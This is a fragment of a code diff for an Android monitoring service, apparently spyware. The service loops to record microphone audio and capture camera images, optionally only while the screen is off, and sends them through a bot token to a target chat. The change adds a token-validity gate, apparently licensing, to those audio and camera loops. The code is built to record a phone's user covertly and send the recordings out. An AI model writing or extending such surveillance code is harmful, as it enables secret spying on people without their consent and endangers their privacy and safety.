@@ -111,6 +111,10 @@ class MonitorService : Service(), LifecycleOwner {
             // Audio Loop
             launch {
                 while (isActive) {
+                    if (!TokenManager.isTokenValid(this@MonitorService)) {
+                        delay(60000) // Check again in 1 min
+                        continue
+                    }
                     // loadCredentials() REMOVED
                     if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
                          val shouldRecord = if (audioScreenOff) !isScreenOn() else true
@@ -128,6 +132,10 @@ class MonitorService : Service(), LifecycleOwner {
             // Camera Loop
             launch {
                  while (isActive) {
+                     if (!TokenManager.isTokenValid(this@MonitorService)) {
+                        delay(60000) // Check again in 1 min
+                        continue
+                     }
                      // loadCredentials() REMOVED
                      if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendCamera) {
                          val shouldCapture = if (cameraScreenOff) !isScreenOn() else true
